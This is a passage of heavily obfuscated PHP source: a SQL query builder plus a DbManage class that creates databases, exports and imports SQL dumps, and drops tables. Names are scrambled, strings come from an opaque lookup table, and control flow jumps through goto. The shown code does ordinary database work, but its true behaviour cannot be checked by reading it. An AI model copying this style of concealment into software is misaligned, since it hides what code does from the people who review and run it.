($cÈôë†ïó) { case $B¤Çˆ££ª[336]: $bòÍÌŸÎö‘ = $DÍÍòô´÷Ä; break; case $B¤Çˆ££ª[914]: $bòÍÌŸÎö‘ = is_string($DÍÍòô´÷Ä) ? $DÍÍòô´÷Ä : substr($this->parseWhere($DÍÍòô´÷Ä), 6); break; case $B¤Çˆ££ª[931]: parse_str($DÍÍòô´÷Ä, $fÉâÁ’Ï); if (isset($fÉâÁ’Ï[$B¤Çˆ££ª[909]])) { $cäëŒÈ£ä˜ = $B¤Çˆ££ª[50] . strtoupper($fÉâÁ’Ï[$B¤Çˆ££ª[909]]) . $B¤Çˆ££ª[50]; unset($fÉâÁ’Ï[$B¤Çˆ££ª[909]]); } else { $cäëŒÈ£ä˜ = $B¤Çˆ££ª[913]; } $Cñ§ã¿Î½ = array(); foreach ($fÉâÁ’Ï as $B¶ãù†¢ÓÎ => $c•åæ“° ) { $Cñ§ã¿Î½[] = $this->parseKey($B¶ãù†¢ÓÎ) . $B¤Çˆ££ª[930] . $this->parseValue($c•åæ“° ); } $bòÍÌŸÎö‘ = implode($cäëŒÈ£ä˜, $Cñ§ã¿Î½); break; } return $bòÍÌŸÎö‘; } protected function parseLimit($E’öŸÜ„Ü) { $dòéåó„àË =& $_SERVER[¼]; return !empty($E’öŸÜ„Ü) ? $dòéåó„àË[48] . $E’öŸÜ„Ü . $dòéåó„àË[50] : $dòéåó„àË[33]; } protected function parseJoin($f—¤ùè¸ˆ¼) { $Fµ˜‰ ¨äõ =& $_SERVER[¼]; $e»‹¨İóÕ = $Fµ˜‰ ¨äõ[33]; if (!empty($f—¤ùè¸ˆ¼)) { if (is_array($f—¤ùè¸ˆ¼)) { foreach ($f—¤ùè¸ˆ¼ as $EÆ—µ‡Øõ„ => $dä²·Š„†) { if (!1 !== stripos($dä²·Š„†, $Fµ˜‰ ¨äõ[932])) { $e»‹¨İóÕ .= $Fµ˜‰ ¨äõ[50] . $dä²·Š„†; } else { $e»‹¨İóÕ .= $Fµ˜‰ ¨äõ[933] . $dä²·Š„†; } } } else { $e»‹¨İóÕ .= $Fµ˜‰ ¨äõ[933] . $f—¤ùè¸ˆ¼; } } $e»‹¨İóÕ = preg_replace($Fµ˜‰ ¨äõ[934], think_config($Fµ˜‰ ¨äõ[837]) . $Fµ˜‰ ¨äõ[935], $e»‹¨İóÕ); return $e»‹¨İóÕ; } protected function parseOrder($DÂ²”‘”¶Á) { $A³…œ¢ ¶Ï =& $_SERVER[¼]; if (is_array($DÂ²”‘”¶Á)) { $CÔ‚¸„»¡ = array(); foreach ($DÂ²”‘”¶Á as $Bº¨›ñ¥åÍ => $eÃÔİÁù†) { if (is_numeric($Bº¨›ñ¥åÍ)) { $CÔ‚¸„»¡[] = $this->parseKey($eÃÔİÁù†); } else { $eÃÔİÁù† = in_array(strtoupper(trim($eÃÔİÁù†)), array($A³…œ¢ ¶Ï[936], $A³…œ¢ ¶Ï[937])) ? $A³…œ¢ ¶Ï[50] . $eÃÔİÁù† : $A³…œ¢ ¶Ï[33]; if (preg_match($A³…œ¢ ¶Ï[938], $Bº¨›ñ¥åÍ)) { $CÔ‚¸„»¡[] = $this->parseKey($Bº¨›ñ¥åÍ) . $eÃÔİÁù†; } else { think_exception($A³…œ¢ ¶Ï[939] . $Bº¨›ñ¥åÍ); } } } $DÂ²”‘”¶Á = implode($A³…œ¢ ¶Ï[47], $CÔ‚¸„»¡); } return !empty($DÂ²”‘”¶Á) ? $A³…œ¢ ¶Ï[940] . $DÂ²”‘”¶Á : $A³…œ¢ ¶Ï[33]; } protected function parseGroup($fô•Ø¸Ë´) { $cÖ˜Îè˜Ã =& $_SERVER[¼]; return !empty($fô•Ø¸Ë´) ? $cÖ˜Îè˜Ã[941] . $fô•Ø¸Ë´ : $cÖ˜Îè˜Ã[33]; } protected function parseHaving($cìÔÃÇ°ï‚) { $Cóì¥‡¢Õ =& $_SERVER[¼]; return !empty($cìÔÃÇ°ï‚) ? $Cóì¥‡¢Õ[942] . $cìÔÃÇ°ï‚ : $Cóì¥‡¢Õ[33]; } protected function parseComment($BÃÛÑĞÊ‚¾) { $Còã‘á³…„ =& $_SERVER[¼]; return !empty($BÃÛÑĞÊ‚¾) ? $Còã‘á³…„[943] . $BÃÛÑĞÊ‚¾ . $Còã‘á³…„[944] : $Còã‘á³…„[33]; } protected function parseDistinct($EˆÕ‡—Ş) { $d„İ¹İß™¾ =& $_SERVER[¼]; return !empty($EˆÕ‡—Ş) ? $d„İ¹İß™¾[945] : $d„İ¹İß™¾[33]; } protected function parseUnion($fÖîÈ‹İÁé) { $cÅšÈ‹²«¦ =& $_SERVER[¼]; if (empty($fÖîÈ‹İÁé)) { return $cÅšÈ‹²«¦[33]; } if (isset($fÖîÈ‹İÁé[$cÅšÈ‹²«¦[333]])) { $fÙÖŒ“ĞÛó = $cÅšÈ‹²«¦[946]; unset($fÖîÈ‹İÁé[$cÅšÈ‹²«¦[333]]); } else { $fÙÖŒ“ĞÛó = $cÅšÈ‹²«¦[947]; } foreach ($fÖîÈ‹İÁé as $F¿Ÿ¢Üî£Ê) { $B…Ğîµ»–¡[] = $fÙÖŒ“ĞÛó . (is_array($F¿Ÿ¢Üî£Ê) ? $this->buildSelectSql($F¿Ÿ¢Üî£Ê) : $F¿Ÿ¢Üî£Ê); } return implode($cÅšÈ‹²«¦[50], $B…Ğîµ»–¡); } public function insert($Aâ ¡¾¶¢ù, $dÁ®ã§µ†Á = array(), $dÛø¡òù· = false) { goto e‘Ú‘ó†È…; ağ»±—ŠºÒ: foreach ($Aâ ¡¾¶¢ù as $có‹¤·‚·˜ => $Fğ‡´Œô”Ó) { if (is_array($Fğ‡´Œô”Ó) && $Bß‡ƒ•ÅÈù[282] == $Fğ‡´Œô”Ó[0]) { $a»¶§„éî¼[] = $this->parseKey($có‹¤·‚·˜); $c¿Ÿ—±°¹[] = $Fğ‡´Œô”Ó[1]; } elseif (is_scalar($Fğ‡´Œô”Ó) || is_null($Fğ‡´Œô”Ó)) { $a»¶§„éî¼[] = $this->parseKey($có‹¤·‚·˜); $c¿Ÿ—±°¹[] = $this->parseValue($Fğ‡´Œô”Ó); } } $D¥áíËí = ($dÛø¡òù· ? $Bß‡ƒ•ÅÈù[814] : $Bß‡ƒ•ÅÈù[815]) . $Bß‡ƒ•ÅÈù[816] . $this->parseTable($dÁ®ã§µ†Á[$Bß‡ƒ•ÅÈù[264]]) . $Bß‡ƒ•ÅÈù[810] . implode($Bß‡ƒ•ÅÈù[47], $a»¶§„éî¼) . $Bß‡ƒ•ÅÈù[811] . implode($Bß‡ƒ•ÅÈù[47], $c¿Ÿ—±°¹) . $Bß‡ƒ•ÅÈù[812]; $D¥áíËí .= $this->parseLock(isset($dÁ®ã§µ†Á[$Bß‡ƒ•ÅÈù[770]]) ? $dÁ®ã§µ†Á[$Bß‡ƒ•ÅÈù[770]] : !1); goto e¨ÅÕè­„Ø; e¨ÅÕè­„Ø: $D¥áíËí .= $this->parseComment(!empty($dÁ®ã§µ†Á[$Bß‡ƒ•ÅÈù[338]]) ? $dÁ®ã§µ†Á[$Bß‡ƒ•ÅÈù[338]] : $Bß‡ƒ•ÅÈù[33]); return $this->execute($D¥áíËí, $this->parseBind(!empty($dÁ®ã§µ†Á[$Bß‡ƒ•ÅÈù[270]]) ? $dÁ®ã§µ†Á[$Bß‡ƒ•ÅÈù[270]] : array())); goto F“Ì¨èŞÌÈ; e‘Ú‘ó†È…: $Bß‡ƒ•ÅÈù =& $_SERVER[¼]; $c¿Ÿ—±°¹ = $a»¶§„éî¼ = array(); $this->model = $dÁ®ã§µ†Á[$Bß‡ƒ•ÅÈù[266]]; goto ağ»±—ŠºÒ; F“Ì¨èŞÌÈ: } public function selectInsert($EŒì§Ú‡ÎÅ, $cŸ§ËšÑ¾, $D¡‹¨öã«ù = array()) { goto AÒäÃæ¬•Ú; Fé‚†¤Ü©‡: array_walk($EŒì§Ú‡ÎÅ, array($this, $c¼‡½¹ÌŠ‡[813])); $CÇÛŞ‚Š†¯ = $c¼‡½¹ÌŠ‡[948] . $this->parseTable($cŸ§ËšÑ¾) . $c¼‡½¹ÌŠ‡[810] . implode($c¼‡½¹ÌŠ‡[47], $EŒì§Ú‡ÎÅ) . $c¼‡½¹ÌŠ‡[927]; $CÇÛŞ‚Š†¯ .= $this->buildSelectSql($D¡‹¨öã«ù); goto eß‚’»ĞÄ´; AÒäÃæ¬•Ú: $c¼‡½¹ÌŠ‡ =& $_SERVER[¼]; $this->model = $D¡‹¨öã«ù[$c¼‡½¹ÌŠ‡[266]]; if (is_string($EŒì§Ú‡ÎÅ)) { $EŒì§Ú‡ÎÅ = explode($c¼‡½¹ÌŠ‡[47], $EŒì§Ú‡ÎÅ); } goto Fé‚†¤Ü©‡; eß‚’»ĞÄ´: return $this->execute($CÇÛŞ‚Š†¯, $this->parseBind(!empty($D¡‹¨öã«ù[$c¼‡½¹ÌŠ‡[270]]) ? $D¡‹¨öã«ù[$c¼‡½¹ÌŠ‡[270]] : array())); goto AÛò…ğéÙë; AÛò…ğéÙë: } public function update($B¥œÍõù¶, $AÆ‹Áâ¤‚ë) { $aƒÀÒÍÒĞŞ =& $_SERVER[¼]; $this->model = $AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[266]]; $cîŞ‡¼­¾ = $aƒÀÒÍÒĞŞ[949] . $this->parseTable($AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[264]]) . $this->parseSet($B¥œÍõù¶) . $this->parseWhere(!empty($AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[260]]) ? $AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[260]] : $aƒÀÒÍÒĞŞ[33]) . $this->parseOrder(!empty($AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[347]]) ? $AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[347]] : $aƒÀÒÍÒĞŞ[33]) . $this->parseLimit(!empty($AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[277]]) ? $AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[277]] : $aƒÀÒÍÒĞŞ[33]) . $this->parseLock(isset($AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[770]]) ? $AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[770]] : !1) . $this->parseComment(!empty($AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[338]]) ? $AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[338]] : $aƒÀÒÍÒĞŞ[33]); return $this->execute($cîŞ‡¼­¾, $this->parseBind(!empty($AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[270]]) ? $AÆ‹Áâ¤‚ë[$aƒÀÒÍÒĞŞ[270]] : array())); } public function delete($eİÜéá°å• = array()) { $fáŞµÒ´Â =& $_SERVER[¼]; $this->model = $eİÜéá°å•[$fáŞµÒ´Â[266]]; $d±·—è§µ = $fáŞµÒ´Â[950] . $this->parseTable($eİÜéá°å•[$fáŞµÒ´Â[264]]) . $this->parseWhere(!empty($eİÜéá°å•[$fáŞµÒ´Â[260]]) ? $eİÜéá°å•[$fáŞµÒ´Â[260]] : $fáŞµÒ´Â[33]) . $this->parseOrder(!empty($eİÜéá°å•[$fáŞµÒ´Â[347]]) ? $eİÜéá°å•[$fáŞµÒ´Â[347]] : $fáŞµÒ´Â[33]) . $this->parseLimit(!empty($eİÜéá°å•[$fáŞµÒ´Â[277]]) ? $eİÜéá°å•[$fáŞµÒ´Â[277]] : $fáŞµÒ´Â[33]) . $this->parseLock(isset($eİÜéá°å•[$fáŞµÒ´Â[770]]) ? $eİÜéá°å•[$fáŞµÒ´Â[770]] : !1) . $this->parseComment(!empty($eİÜéá°å•[$fáŞµÒ´Â[338]]) ? $eİÜéá°å•[$fáŞµÒ´Â[338]] : $fáŞµÒ´Â[33]); return $this->execute($d±·—è§µ, $this->parseBind(!empty($eİÜéá°å•[$fáŞµÒ´Â[270]]) ? $eİÜéá°å•[$fáŞµÒ´Â[270]] : array())); } public function select($dñÛÒ¾˜” = array()) { goto a‘ê±—²’İ; Dºö”ôï…: $E¨ùšÑÚì = isset($dñÛÒ¾˜”[$aŞîŸìîö[334]]) ? $dñÛÒ¾˜”[$aŞîŸìîö[334]] : !1; if ($E¨ùšÑÚì) { $A•ùËãŸ©æ = is_string($E¨ùšÑÚì[$aŞîŸìîö[89]]) ? $E¨ùšÑÚì[$aŞîŸìîö[89]] : $aŞîŸìîö[951] . md5($D¾ğÚ„ÓÖ³); $bçÎ÷ôš’Ç = think_cache($A•ùËãŸ©æ, $aŞîŸìîö[33], $E¨ùšÑÚì); if (!1 !== $bçÎ÷ôš’Ç) { return $bçÎ÷ôš’Ç; } } $eóÀ¶È¢à = $this->query($D¾ğÚ„ÓÖ³, $this->parseBind(!empty($dñÛÒ¾˜”[$aŞîŸìîö[270]]) ? $dñÛÒ¾˜”[$aŞîŸìîö[270]] : array())); goto bäâµ¬; a‘ê±—²’İ: $aŞîŸìîö =& $_SERVER[¼]; $this->model = $dñÛÒ¾˜”[$aŞîŸìîö[266]]; $D¾ğÚ„ÓÖ³ = $this->buildSelectSql($dñÛÒ¾˜”); goto Dºö”ôï…; bäâµ¬: if ($E¨ùšÑÚì && !1 !== $eóÀ¶È¢à) { think_cache($A•ùËãŸ©æ, $eóÀ¶È¢à, $E¨ùšÑÚì); } return $eóÀ¶È¢à; goto E¶ŠšÁå…ø; E¶ŠšÁå…ø: } public function buildSelectSql($a§§ëĞŒò = array()) { goto b®²¬Ğ›ˆë; b®²¬Ğ›ˆë: $c­³·ö› Ô =& $_SERVER[¼]; if (isset($a§§ëĞŒò[$c­³·ö› Ô[337]])) { if (strpos($a§§ëĞŒò[$c­³·ö› Ô[337]], $c­³·ö› Ô[47])) { list($c³Ù‚§È³â, $A…÷öØã×) = explode($c­³·ö› Ô[47], $a§§ëĞŒò[$c­³·ö› Ô[337]]); } else { $c³Ù‚§È³â = $a§§ëĞŒò[$c­³·ö› Ô[337]]; } $c³Ù‚§È³â = $c³Ù‚§È³â ? $c³Ù‚§È³â : 1; $A…÷öØã× = isset($A…÷öØã×) ? $A…÷öØã× : (is_numeric($a§§ëĞŒò[$c­³·ö› Ô[277]]) ? $a§§ëĞŒò[$c­³·ö› Ô[277]] : 20); $Cù™ç¨ƒ = $A…÷öØã× * ((int) $c³Ù‚§È³â - 1); $a§§ëĞŒò[$c­³·ö› Ô[277]] = $Cù™ç¨ƒ . $c­³·ö› Ô[47] . $A…÷öØã×; } if (think_config($c­³·ö› Ô[952])) { $BÈ®Í„ÃŠ = $c­³·ö› Ô[953] . md5(serialize($a§§ëĞŒò)); $eİßĞ‰á» = think_cache($BÈ®Í„ÃŠ); if ($eİßĞ‰á») { return $eİßĞ‰á»; } } goto aå´¡½»Ú; Fø²…¢ç: return $bé¤ö¸º¾ ; goto D˜Ÿ÷¾õ‡; aå´¡½»Ú: $bé¤ö¸º¾  = $this->parseSql($this->selectSql, $a§§ëĞŒò); $bé¤ö¸º¾  .= $this->parseLock(isset($a§§ëĞŒò[$c­³·ö› Ô[770]]) ? $a§§ëĞŒò[$c­³·ö› Ô[770]] : !1); if (isset($BÈ®Í„ÃŠ)) { think_cache($BÈ®Í„ÃŠ, $bé¤ö¸º¾ ); } goto Fø²…¢ç; D˜Ÿ÷¾õ‡: } public function parseSql($cÇºµçïìŠ, $A‰Æø©Íá” = array()) { $F„³«â¹ô“ =& $_SERVER[¼]; $cÇºµçïìŠ = str_replace(array($F„³«â¹ô“[954], $F„³«â¹ô“[955], $F„³«â¹ô“[956], $F„³«â¹ô“[957], $F„³«â¹ô“[958], $F„³«â¹ô“[959], $F„³«â¹ô“[960], $F„³«â¹ô“[961], $F„³«â¹ô“[962], $F„³«â¹ô“[963], $F„³«â¹ô“[964]), array($this->parseTable("{$A‰Æø©Íá”[$F„³«â¹ô“[264]]}"), $this->parseDistinct(isset($A‰Æø©Íá”[$F„³«â¹ô“[965]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[965]] : !1), $this->parseField(!empty($A‰Æø©Íá”[$F„³«â¹ô“[258]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[258]] : $F„³«â¹ô“[173]), $this->parseJoin(!empty($A‰Æø©Íá”[$F„³«â¹ô“[267]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[267]] : $F„³«â¹ô“[33]), $this->parseWhere(!empty($A‰Æø©Íá”[$F„³«â¹ô“[260]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[260]] : $F„³«â¹ô“[33]), $this->parseGroup(!empty($A‰Æø©Íá”[$F„³«â¹ô“[966]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[966]] : $F„³«â¹ô“[33]), $this->parseHaving(!empty($A‰Æø©Íá”[$F„³«â¹ô“[967]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[967]] : $F„³«â¹ô“[33]), $this->parseOrder(!empty($A‰Æø©Íá”[$F„³«â¹ô“[347]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[347]] : $F„³«â¹ô“[33]), $this->parseLimit(!empty($A‰Æø©Íá”[$F„³«â¹ô“[277]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[277]] : $F„³«â¹ô“[33]), $this->parseUnion(!empty($A‰Æø©Íá”[$F„³«â¹ô“[332]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[332]] : $F„³«â¹ô“[33]), $this->parseComment(!empty($A‰Æø©Íá”[$F„³«â¹ô“[338]]) ? $A‰Æø©Íá”[$F„³«â¹ô“[338]] : $F„³«â¹ô“[33])), $cÇºµçïìŠ); return $cÇºµçïìŠ; } public function getLastSql($Fµò’İŒ¾” = '') { return $Fµò’İŒ¾” ? $this->modelSql[$Fµò’İŒ¾”] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($A ŒÃ®øà) { return addslashes($A ŒÃ®øà); } public function setModel($BÇÜ‚ôˆÇÌ) { $this->model = $BÇÜ‚ôˆÇÌ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($dò¨ç«Üïá, $eçÊİ…â¯ = '') { $this->database = $dò¨ç«Üïá; $this->type = $eçÊİ…â¯; } public function model($DàÎ¡¼öî = '') { return new ModelBase($DàÎ¡¼öî, $_SERVER[¼][33], $this->database); } public function db($DÕÚ¹á¡Œ = false) { goto e‚¬´§ğÂè; d²¤‘‰¸áâ: if (!$Eê”ğ¯‰¥) { $AÒ¿ìÇÌ¬->execute("\143\162\145\141\164\145\40\x64\141\x74\x61\x62\141\163\x65\40\x60{$bä‘ïéí¼}\140"); } $cùÃ·ˆã÷†[$bò¬óêØÖ[231]] = $bä‘ïéí¼; if ($cùÃ·ˆã÷†[$bò¬óêØÖ[883]] == $bò¬óêØÖ[716]) { $cùÃ·ˆã÷†[$bò¬óêØÖ[882]] .= $bò¬óêØÖ[968] . $bä‘ïéí¼; } goto dŒ·×……ö–; e‚¬´§ğÂè: $bò¬óêØÖ =& $_SERVER[¼]; $cùÃ·ˆã÷† = $this->database; if ($this->type == $bò¬óêØÖ[9] || !$DÕÚ¹á¡Œ) { return $this->model()->db(); } goto E‘îöËí¯Û; dŒ·×……ö–: $this->database = $cùÃ·ˆã÷†; $AÒ¿ìÇÌ¬->execute("\165\x73\145\x20\140{$bä‘ïéí¼}\x60"); return $AÒ¿ìÇÌ¬; goto f¿áÈîµò; b‰ØÚõºÌ: $this->database = $cùÃ·ˆã÷†; $AÒ¿ìÇÌ¬ = $this->model()->db(); $Eê”ğ¯‰¥ = $AÒ¿ìÇÌ¬->execute("\x73\150\x6f\167\x20\144\x61\x74\141\142\141\163\145\x73\x20\154\x69\x6b\x65\40\47{$bä‘ïéí¼}\47"); goto d²¤‘‰¸áâ; E‘îöËí¯Û: $bä‘ïéí¼ = $cùÃ·ˆã÷†[$bò¬óêØÖ[231]]; $cùÃ·ˆã÷†[$bò¬óêØÖ[231]] = $bò¬óêØÖ[33]; if ($cùÃ·ˆã÷†[$bò¬óêØÖ[883]] == $bò¬óêØÖ[716]) { $e×‚Éå”ÏÛ = $cùÃ·ˆã÷†[$bò¬óêØÖ[882]]; $cùÃ·ˆã÷†[$bò¬óêØÖ[882]] = substr($e×‚Éå”ÏÛ, 0, strrpos($e×‚Éå”ÏÛ, $bò¬óêØÖ[968])); } goto b‰ØÚõºÌ; f¿áÈîµò: } public function createTable($fŸÏÅ±Ù«…, $CÇ‡É‘Ó = null) { $A‰Şî‚Šè³ =& $_SERVER[¼]; if (!IO::exist($fŸÏÅ±Ù«…)) { show_json(LNG($A‰Şî‚Šè³[969]), !1); } $eƒªˆó¥ô = sqlSplit(IO::getContent($fŸÏÅ±Ù«…)); foreach ($eƒªˆó¥ô as $A¶¿„œõ) { if ($CÇ‡É‘Ó) { $fÜƒ¹…¥À = stripos($A¶¿„œõ, $A‰Şî‚Šè³[970]) === 0; if ($fÜƒ¹…¥À) { $CÇ‡É‘Ó->task[$A‰Şî‚Šè³[971]] += 1; } } $this->model()->db()->execute($A¶¿„œõ); if ($CÇ‡É‘Ó && $fÜƒ¹…¥À) { $AŒ»óÙ¶§ = $A‰Şî‚Šè³[972]; preg_match($AŒ»óÙ¶§, $A¶¿„œõ, $dğ®–²ğòß); $CÇ‡É‘Ó->task[$A‰Şî‚Šè³[973]] = trim($EöÖ°ÛÆê[0], $A‰Şî‚Šè³[819]); $CÇ‡É‘Ó->update(1); } } $this->taskToCache($CÇ‡É‘Ó); } public function insertTable($aï×©âèÚÉ, $fŸ•†Ô®ô = null) { $b‰Ø…Ê×áä =& $_SERVER[¼]; foreach ($aï×©âèÚÉ as $a©Œ§ÂƒÓ¹) { $d×Şæ¼ÙÓÉ = basename($a©Œ§ÂƒÓ¹); $d×Şæ¼ÙÓÉ = substr($d×Şæ¼ÙÓÉ, 0, strrpos($d×Şæ¼ÙÓÉ, $b‰Ø…Ê×áä[93])); if ($fŸ•†Ô®ô) { $fŸ•†Ô®ô->task[$b‰Ø…Ê×áä[973]] = $d×Şæ¼ÙÓÉ; } if (get_filesize($a©Œ§ÂƒÓ¹) == 0) { continue; } $CÃŠ£ô¦±Ñ = $this->sqlToDb($a©Œ§ÂƒÓ¹, $fŸ•†Ô®ô); if (!$CÃŠ£ô¦±Ñ) { show_json(LNG($b‰Ø…Ê×áä[974]) . "\x5b{$d×Şæ¼ÙÓÉ}\x5d", !1); } } $this->taskToCache($fŸ•†Ô®ô); } public function sqlFromDb($B©à‘ºâğÚ, $F¢­ğä¯ğñ, $EÄë„õ“”¾ = null, $Eˆ›ç³¹«‘ = null) { goto E÷ÛğÅ¦èô; E÷ÛğÅ¦èô: if ($EÄë„õ“”¾) { $EÄë„õ“”¾->task[$_SERVER[¼][973]] = $B©à‘ºâğÚ; } $CÁöœÌä¶À = $this->model($B©à‘ºâğÚ); $f•ªĞ§¶· = 0; goto då¡›ÙÛ¿; då¡›ÙÛ¿: $E‘ä™ŠÆ„è = 1; $bÁœéòÂšÛ = 500; $Dƒë¥¦Õ¦§ = fopen($F¢­ğä¯ğñ, $_SERVER[¼][975]); goto cŸ·º—¬¦Á; C¥ˆ×©Öéë: fclose($Dƒë¥¦Õ¦§); return $f•ªĞ§¶·; goto bÓÄ¢¾Ì¬è; cŸ·º—¬¦Á: $cºÂ ï¤± = $CÁöœÌä¶À->getPk(); $A±´ˆî”Ò£ = $CÁöœÌä¶À->getDbFields(); do { $CÀõš÷¼Ã = $CÁöœÌä¶À->field($A±´ˆî”Ò£)->order($cºÂ ï¤± . $_SERVER[¼][976])->selectPage($bÁœéòÂšÛ, $E‘ä™ŠÆ„è); $AìÖªõéƒõ = !empty($CÀõš÷¼Ã[$_SERVER[¼][351]]) ? $CÀõš÷¼Ã[$_SERVER[¼][351]] : array(); if (!($BÂ»é¯Ù© = count($AìÖªõéƒõ))) { break; } if ($EÄë„õ“”¾) { $EÄë„õ“”¾->task[$_SERVER[¼][971]] += $BÂ»é¯Ù©; } $aĞÎì ÓÃ = array(); foreach ($AìÖªõéƒõ as $AÁïÌ÷«ÔÛ) { if ($Eˆ›ç³¹«‘) { $AÁïÌ÷«ÔÛ[$_SERVER[¼][75]] = "\x7b\x69\157\x3a{$Eˆ›ç³¹«‘}\x7d" . substr($AÁïÌ÷«ÔÛ[$_SERVER[¼][75]], strlen("\173\151\x6f\x3a{$AÁïÌ÷«ÔÛ[$_SERVER[¼][735]]}\x7d")); $AÁïÌ÷«ÔÛ[$_SERVER[¼][735]] = $Eˆ›ç³¹«‘; } $aĞÎì ÓÃ[] = $_SERVER[¼][977] . $this->sqlEncode($AÁïÌ÷«ÔÛ) . $_SERVER[¼][978]; } $ešÖÊ¯†Ëë = "\111\116\123\x45\x52\124\x20\111\116\x54\x4f\40\140{$B©à‘ºâğÚ}\x60\40\x28\140" . implode($_SERVER[¼][979], $A±´ˆî”Ò£) . $_SERVER[¼][980]; fwrite($Dƒë¥¦Õ¦§, $ešÖÊ¯†Ëë . implode($_SERVER[¼][981], $aĞÎì ÓÃ) . $_SERVER[¼][67] . PHP_EOL); $E‘ä™ŠÆ„è++; $f•ªĞ§¶· += $BÂ»é¯Ù©; if ($EÄë„õ“”¾) { $EÄë„õ“”¾->update($BÂ»é¯Ù©); } } while ($BÂ»é¯Ù© == $bÁœéòÂšÛ); goto C¥ˆ×©Öéë; bÓÄ¢¾Ì¬è: } public function sqlToDb($E…‰ÔÊßİ‡, $b©†êˆã£õ = null) { goto B­…Óø›½; c Ç¾øÖ©ª: if ($fŠ¡å³òÊ§) { $fŠ¡å³òÊ§ = rtrim(trim($fŠ¡å³òÊ§), $E°á¯©©æŠ[67]); if (!$aì¤Ç­À½->execute($fŠ¡å³òÊ§)) { return !1; } if ($b©†êˆã£õ) { $b©†êˆã£õ->update($FÕä—ƒá‘ - 1); } } return !0; goto Dˆ»–Î®; CÜâÜÆÜ: if (!$e‡™‰ÊÒ­Ó) { return !1; } $FÕä—ƒá‘ = 0; $fŠ¡å³òÊ§ = $E°á¯©©æŠ[33]; goto dáİ¬¸ù¤¦; B­…Óø›½: $E°á¯©©æŠ =& $_SERVER[¼]; $aì¤Ç­À½ = $this->model()->db(); $e‡™‰ÊÒ­Ó = @fopen($E…‰ÔÊßİ‡, $E°á¯©©æŠ[982]); goto CÜâÜÆÜ; dáİ¬¸ù¤¦: $bõ×‹ŒÇÒ = 500 + 1; while (!feof($e‡™‰ÊÒ­Ó)) { if ($b©†êˆã£õ && $FÕä—ƒá‘ != 0) { $b©†êˆã£õ->task[$E°á¯©©æŠ[971]] += 1; } $FÕä—ƒá‘++; $A¹ŸÌ‚õÎ = trim(fgets($e‡™‰ÊÒ­Ó)); $fŠ¡å³òÊ§ .= $E°á¯©©æŠ[50] . $this->sqlDecode($A¹ŸÌ‚õÎ, $this->type); if ($FÕä—ƒá‘ == $bõ×‹ŒÇÒ) { $fŠ¡å³òÊ§ = rtrim(trim($fŠ¡å³òÊ§), $E°á¯©©æŠ[67]); if (!$aì¤Ç­À½->execute($fŠ¡å³òÊ§)) { return !1; } if ($b©†êˆã£õ) { $b©†êˆã£õ->update($FÕä—ƒá‘ - 1); } $fŠ¡å³òÊ§ = $E°á¯©©æŠ[33]; $FÕä—ƒá‘ = 0; } } fclose($e‡™‰ÊÒ­Ó); goto c Ç¾øÖ©ª; Dˆ»–Î®: } public function dropTable($Cå·÷‹îìù = null) { $A¸­ŠŠÈÖâ = $this->model()->db(); $d¾±œ£©§ = $Cå·÷‹îìù ? array($Cå·÷‹îìù) : $A¸­ŠŠÈÖâ->getTables(); if (!$d¾±œ£©§) { return; } foreach ($d¾±œ£©§ as $Cå·÷‹îìù) { $A¸­ŠŠÈÖâ->execute("\x64\x72\x6f\160\40\x74\141\x62\x6c\x65\40\x69\x66\x20\145\170\x69\163\x74\x73\40\x60{$Cå·÷‹îìù}\140"); } } private function taskToCache($Dæš£¯„å = null) { $f¨ˆé¤º£ =& $_SERVER[¼]; if (!$Dæš£¯„å) { return; } $cÂÕ†„èî‰ = array($f¨ˆé¤º£[973] => $Dæš£¯„å->task[$f¨ˆé¤º£[973]], $f¨ˆé¤º£[971] => $Dæš£¯„å->task[$f¨ˆé¤º£[971]], $f¨ˆé¤º£[983] => $Dæš£¯„å->task[$f¨ˆé¤º£[983]]); if ($cÂÕ†„èî‰[$f¨ˆé¤º£[971]] == $cÂÕ†„èî‰[$f¨ˆé¤º£[983]]) { $cÂÕ†„èî‰[$f¨ˆé¤º£[688]] = 1; } Cache::set($f¨ˆé¤º£[984] . $Dæš£¯„å->task[$f¨ˆé¤º£[364]], $cÂÕ†„èî‰); $Dæš£¯„å->end(); } private function sqlEncode($dÔ‹õ¹§Œ) { $EÈ”‡â—àï =& $_SERVER[¼]; $BËëñ‚½âÁ = array(); foreach ($dÔ‹õ¹§Œ as $bÅÕÉ¶‹’ó) { if (is_array($bÅÕÉ¶‹’ó)) { $bÅÕÉ¶‹’ó = json_encode_force($bÅÕÉ¶‹’ó); } $bÅÕÉ¶‹’ó = addslashes($bÅÕÉ¶‹’ó); $bÅÕÉ¶‹’ó = str_replace(array($EÈ”‡â—àï[985], $EÈ”‡â—àï[214]), array($EÈ”‡â—àï[986], $EÈ”‡â—àï[987]), $bÅÕÉ¶‹’ó); $BËëñ‚½âÁ[] = str_replace($EÈ”‡â—àï[55], $EÈ”‡â—àï[988], $bÅÕÉ¶‹’ó); } return $EÈ”‡â—àï[55] . implode($EÈ”‡â—àï[989], $BËëñ‚½âÁ) . $EÈ”‡â—àï[55]; } private function sqlDecode($bõ¶½ô¯ô, 